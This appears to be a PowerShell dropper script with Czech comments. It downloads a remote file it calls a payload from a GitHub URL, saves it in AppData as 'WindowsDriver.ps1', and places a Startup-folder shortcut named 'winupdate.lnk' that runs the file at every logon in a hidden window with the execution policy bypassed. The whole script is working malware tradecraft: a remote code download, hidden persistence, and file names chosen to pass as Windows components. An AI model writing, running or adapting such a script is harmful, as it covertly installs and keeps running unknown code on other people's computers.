Add-Content -Path "$env:TEMP\vecra_debug.log" -Value "Skript spuštěn: $(Get-Date)"

# 1. Stáhni payload
$payloadUrl = "https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Vecra1.ps1"
$localPath = "$env:APPDATA\WindowsDriver.ps1"
Invoke-WebRequest -Uri $payloadUrl -OutFile $localPath

$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.lnk"
$wsh = New-Object -ComObject WScript.Shell
$shortcut = $wsh.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPath`""
$shortcut.Save()
